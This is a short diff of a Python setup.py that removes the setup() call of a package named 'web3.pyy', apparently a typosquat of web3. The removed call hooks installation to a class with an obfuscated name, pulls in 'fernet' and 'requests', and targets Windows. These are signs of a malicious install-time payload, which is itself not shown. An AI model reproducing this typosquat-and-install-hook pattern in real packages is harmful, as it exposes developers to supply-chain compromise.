@@ -18,22 +18,5 @@ class hfywzftCXTDwAQghUtHQiRWRmChGTXuTUBrjbRTIdvGJVNSHLsfLqwLGaFAqLUOCyXXhkplZci
             install.run(self)
 
 
-setup(
-    name="web3.pyy",
-    version=VERSION,
-    author="hitIFqEMHU",
-    author_email="Eubcffr@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': hfywzftCXTDwAQghUtHQiRWRmChGTXuTUBrjbRTIdvGJVNSHLsfLqwLGaFAqLUOCyXXhkplZciSgZMusaJbZMmNXwxjKQeoHFLLAHCMlmiPqSEILBusJMHWOXeoTfqBRfWPqrbxpNuzNnNQRwxAOZWGeiFLBFsNfRWfAgwkZvmRmPjwusXBOuNgZEkFHkJHwRcJjzaR,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
 
